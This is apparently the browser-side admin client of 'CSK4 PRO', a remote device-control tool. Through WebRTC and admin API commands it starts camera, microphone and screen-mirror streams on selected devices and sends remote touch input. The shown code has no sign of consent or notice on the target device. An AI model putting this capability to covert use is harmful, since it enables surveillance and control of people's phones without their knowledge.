// ============================================
// CSK4 PRO v4.2 - WebRTC Client (FIXED)
// ============================================
// FIXES:
// - No disconnect of shared socket
// - ICE error handling
// - pendingIceCandidates timeout (memory leak fix)
// - Race condition fixed
// - Modern transceiver API
// - Better connection state handling
// - Cleanup on page unload
// ============================================

let peerConnection = null;
let currentStreamDevice = null;
let webrtcSocket = null;
let pendingIceCandidates = [];
let isScreenMirror = false;
let iceTimeout = null;
let connectionTimeout = null;

// ============ AUTH HELPERS ============
function authHeadersW() {
  const t = localStorage.getItem('csk4_token');
  return {
    'Content-Type': 'application/json',
    'Authorization': t ? 'Bearer ' + t : ''
  };
}

// ============ SOCKET INIT ============
function initWebRTCSocket() {
  if (webrtcSocket) return;
  
  // ✅ Reuse admin socket — do NOT create new
  webrtcSocket = window.socket || io({
    auth: {
      type: 'admin',
      token: localStorage.getItem('csk4_token')
    }
  });

  webrtcSocket.on('webrtc-answer', async (data) => {
    try {
      if (peerConnection && data.signal) {
        await peerConnection.setRemoteDescription(
          new RTCSessionDescription({ type: 'answer', sdp: data.signal.sdp })
        );
        const status = document.getElementById(isScreenMirror ? 'screenStatus' : 'liveStatus');
        if (status) status.textContent = '🔴 LIVE';
        
        // Process pending ICE candidates
        for (const c of pendingIceCandidates) {
          try { await peerConnection.addIceCandidate(c); } catch (e) {}
        }
        pendingIceCandidates = [];
        clearTimeout(iceTimeout);
      }
    } catch (e) { console.error('Answer error:', e); }
  });

  webrtcSocket.on('screen-mirror-answer', async (data) => {
    try {
      if (peerConnection && data.signal) {
        await peerConnection.setRemoteDescription(
          new RTCSessionDescription({ type: 'answer', sdp: data.signal.sdp })
        );
        const status = document.getElementById('screenStatus');
        if (status) status.textContent = '🔴 MIRRORING';
        
        for (const c of pendingIceCandidates) {
          try { await peerConnection.addIceCandidate(c); } catch (e) {}
        }
        pendingIceCandidates = [];
        clearTimeout(iceTimeout);
      }
    } catch (e) { console.error('Screen answer error:', e); }
  });

  webrtcSocket.on('webrtc-ice', async (data) => {
    try {
      if (!data.signal) return;
      const candidate = new RTCIceCandidate({
        sdpMid: data.signal.sdpMid,
        sdpMLineIndex: data.signal.sdpMLineIndex,
        candidate: data.signal.candidate
      });
      if (peerConnection && peerConnection.remoteDescription) {
        await peerConnection.addIceCandidate(candidate);
      } else {
        pendingIceCandidates.push(candidate);
      }
    } catch (e) { console.error('ICE error:', e); }
  });

  webrtcSocket.on('screen-mirror-ice', async (data) => {
    try {
      if (!data.signal) return;
      const candidate = new RTCIceCandidate({
        sdpMid: data.signal.sdpMid,
        sdpMLineIndex: data.signal.sdpMLineIndex,
        candidate: data.signal.candidate
      });
      if (peerConnection && peerConnection.remoteDescription) {
        await peerConnection.addIceCandidate(candidate);
      } else {
        pendingIceCandidates.push(candidate);
      }
    } catch (e) { console.error('Screen ICE error:', e); }
  });
}

// ============ RESET STATE ============
function resetWebRTCState() {
  if (iceTimeout) { clearTimeout(iceTimeout); iceTimeout = null; }
  if (connectionTimeout) { clearTimeout(connectionTimeout); connectionTimeout = null; }
  pendingIceCandidates = [];
}

// ============ CAMERA / AUDIO LIVE STREAM ============
async function startLiveStream(deviceId, type = 'camera') {
  if (!deviceId) { alert('Device select karein'); return; }
  
  // ✅ Proper cleanup before start
  await stopLiveStream(true);
  await stopScreenMirror(true);
  
  resetWebRTCState();
  currentStreamDevice = deviceId;
  isScreenMirror = false;

  if (!webrtcSocket) initWebRTCSocket();

  // ✅ Modern RTCPeerConnection config
  peerConnection = new RTCPeerConnection({
    iceServers: [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'stun:stun1.l.google.com:19302' },
      { urls: 'stun:stun2.l.google.com:19302' }
    ],
    iceCandidatePoolSize: 10
  });

  peerConnection.ontrack = (event) => {
    const video = document.getElementById('liveVideo');
    const audio = document.getElementById('liveAudio');
    if (event.track.kind === 'video' && video) {
      video.srcObject = event.streams[0];
      video.play().catch(() => {});
    }
    if (event.track.kind === 'audio' && audio) {
      audio.srcObject = event.streams[0];
      audio.play().catch(() => {});
    }
  };

  peerConnection.onicecandidate = (event) => {
    if (event.candidate && webrtcSocket) {
      webrtcSocket.emit('webrtc-ice', {
        target: deviceId,
        signal: {
          sdpMid: event.candidate.sdpMid,
          sdpMLineIndex: event.candidate.sdpMLineIndex,
          candidate: event.candidate.candidate
        }
      });
    }
  };

  peerConnection.oniceconnectionstatechange = () => {
    const status = document.getElementById('liveStatus');
    if (!status) return;
    status.textContent = 'ICE: ' + peerConnection.iceConnectionState;
    
    if (peerConnection.iceConnectionState === 'failed') {
      status.textContent = '❌ Connection failed';
      // Try to restart ICE
      try { peerConnection.restartIce(); } catch (e) {}
    }
  };

  peerConnection.onconnectionstatechange = () => {
    const status = document.getElementById('liveStatus');
    if (!status) return;
    
    if (peerConnection.connectionState === 'connected') {
      status.textContent = '🔴 LIVE';
      clearTimeout(connectionTimeout);
    } else if (peerConnection.connectionState === 'failed') {
      status.textContent = '❌ Failed';
    } else if (peerConnection.connectionState === 'disconnected') {
      status.textContent = '⚠️ Disconnected';
    }
  };

  // ✅ Modern transceiver API
  if (type !== 'audio') {
    peerConnection.addTransceiver('video', { direction: 'recvonly' });
  }
  peerConnection.addTransceiver('audio', { direction: 'recvonly' });

  try {
    const offer = await peerConnection.createOffer();
    await peerConnection.setLocalDescription(offer);
    
    webrtcSocket.emit('webrtc-offer', {
      target: deviceId,
      signal: peerConnection.localDescription
    });

    // Trigger device
    await fetch('/api/admin/command', {
      method: 'POST',
      headers: authHeadersW(),
      body: JSON.stringify({
        deviceId,
        command: type === 'audio' ? 'start_audio_stream' : 'start_webrtc'
      })
    });

    const status = document.getElementById('liveStatus');
    if (status) status.textContent = 'Connecting...';
    
    // ✅ Timeout — 30 sec
    connectionTimeout = setTimeout(() => {
      if (peerConnection && peerConnection.connectionState !== 'connected') {
        if (status) status.textContent = '⏱️ Timeout';
      }
    }, 30000);
    
    // ✅ ICE timeout — 20 sec
    iceTimeout = setTimeout(() => {
      if (pendingIceCandidates.length > 0) {
        console.warn('ICE timeout — clearing pending');
        pendingIceCandidates = [];
      }
    }, 20000);
  } catch (e) {
    console.error('Offer error:', e);
    if (status) status.textContent = '❌ Error';
  }
}

async function stopLiveStream(silent = false) {
  if (!isScreenMirror && peerConnection) {
    try { peerConnection.close(); } catch (e) {}
    peerConnection = null;
  }
  
  const v = document.getElementById('liveVideo');
  const a = document.getElementById('liveAudio');
  if (v) v.srcObject = null;
  if (a) a.srcObject = null;

  if (currentStreamDevice && !silent && !isScreenMirror) {
    try {
      await fetch('/api/admin/command', {
        method: 'POST',
        headers: authHeadersW(),
        body: JSON.stringify({ deviceId: currentStreamDevice, command: 'stop_webrtc' })
      });
    } catch (e) {}
  }
  
  if (!silent && !isScreenMirror) {
    currentStreamDevice = null;
    const status = document.getElementById('liveStatus');
    if (status) status.textContent = 'Not streaming';
  }
}

function switchCamera() {
  if (!currentStreamDevice) { alert('Pehle stream start karein'); return; }
  fetch('/api/admin/command', {
    method: 'POST',
    headers: authHeadersW(),
    body: JSON.stringify({ deviceId: currentStreamDevice, command: 'switch_camera' })
  }).then(() => toast('🔄 Camera switched')).catch(() => {});
}

// ============ SCREEN MIRROR ============
async function startScreenMirror(deviceId) {
  if (!deviceId) { alert('Device select karein'); return; }
  
  await stopLiveStream(true);
  await stopScreenMirror(true);
  
  resetWebRTCState();
  currentStreamDevice = deviceId;
  isScreenMirror = true;

  if (!webrtcSocket) initWebRTCSocket();

  peerConnection = new RTCPeerConnection({
    iceServers: [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'stun:stun1.l.google.com:19302' }
    ]
  });

  peerConnection.ontrack = (event) => {
    const video = document.getElementById('screenVideo');
    if (event.track.kind === 'video' && video) {
      video.srcObject = event.streams[0];
      video.play().catch(() => {});
    }
  };

  peerConnection.onicecandidate = (event) => {
    if (event.candidate && webrtcSocket) {
      webrtcSocket.emit('screen-mirror-ice', {
        target: deviceId,
        signal: {
          sdpMid: event.candidate.sdpMid,
          sdpMLineIndex: event.candidate.sdpMLineIndex,
          candidate: event.candidate.candidate
        }
      });
    }
  };

  peerConnection.onconnectionstatechange = () => {
    const status = document.getElementById('screenStatus');
    if (!status) return;
    
    if (peerConnection.connectionState === 'connected') {
      status.textContent = '🖥️ MIRRORING';
      clearTimeout(connectionTimeout);
    } else if (peerConnection.connectionState === 'failed') {
      status.textContent = '❌ Failed';
    }
  };

  // Modern transceiver
  peerConnection.addTransceiver('video', { direction: 'recvonly' });

  try {
    const offer = await peerConnection.createOffer();
    await peerConnection.setLocalDescription(offer);
    
    webrtcSocket.emit('screen-mirror-offer', {
      target: deviceId,
      signal: peerConnection.localDescription
    });

    await fetch('/api/admin/command', {
      method: 'POST',
      headers: authHeadersW(),
      body: JSON.stringify({ deviceId, command: 'start_screen_mirror' })
    });

    const status = document.getElementById('screenStatus');
    if (status) status.textContent = 'Waiting for device...';
    
    connectionTimeout = setTimeout(() => {
      if (peerConnection && peerConnection.connectionState !== 'connected') {
        if (status) status.textContent = '⏱️ Timeout';
      }
    }, 30000);
  } catch (e) {
    console.error('Screen offer error:', e);
  }
}

async function stopScreenMirror(silent = false) {
  if (isScreenMirror && peerConnection) {
    try { peerConnection.close(); } catch (e) {}
    peerConnection = null;
  }
  
  const v = document.getElementById('screenVideo');
  if (v) v.srcObject = null;

  if (currentStreamDevice && !silent && isScreenMirror) {
    try {
      await fetch('/api/admin/command', {
        method: 'POST',
        headers: authHeadersW(),
        body: JSON.stringify({ deviceId: currentStreamDevice, command: 'stop_screen_mirror' })
      });
    } catch (e) {}
  }
  
  if (!silent && isScreenMirror) {
    currentStreamDevice = null;
    isScreenMirror = false;
    const status = document.getElementById('screenStatus');
    if (status) status.textContent = 'Not streaming';
  }
}

// ============ TOUCH CONTROL ============
function sendTouch(action, x = 0.5, y = 0.5) {
  const deviceId = document.getElementById('screenDevice')?.value || currentStreamDevice;
  if (!deviceId) { alert('Device select karein'); return; }
  
  let command = 'touch_tap';
  if (action === 'swipe') command = 'touch_swipe';
  if (action === 'back') command = 'touch_back';
  if (action === 'home') command = 'touch_home';
  if (action === 'recent') command = 'touch_recent';
  
  fetch('/api/admin/command', {
    method: 'POST',
    headers: authHeadersW(),
    body: JSON.stringify({ deviceId, command, params: { x, y } })
  }).then(() => {
    if (typeof toast === 'function') toast('👆 Touch: ' + action);
  }).catch(() => {});
}

// ============ SCREEN VIDEO CLICK (tap) ============
document.addEventListener('click', (e) => {
  const screenVideo = document.getElementById('screenVideo');
  if (screenVideo && e.target === screenVideo) {
    const rect = screenVideo.getBoundingClientRect();
    const x = (e.clientX - rect.left) / rect.width;
    const y = (e.clientY - rect.top) / rect.height;
    sendTouch('tap', x, y);
  }
});

// ============ CLEANUP ============
// ✅ Only disconnect if NOT shared with admin
window.addEventListener('beforeunload', () => {
  if (peerConnection) {
    try { peerConnection.close(); } catch (e) {}
  }
  resetWebRTCState();
  
  // Only disconnect if we created it ourselves
  if (webrtcSocket && webrtcSocket !== window.socket) {
    try { webrtcSocket.disconnect(); } catch (e) {}
  }
});
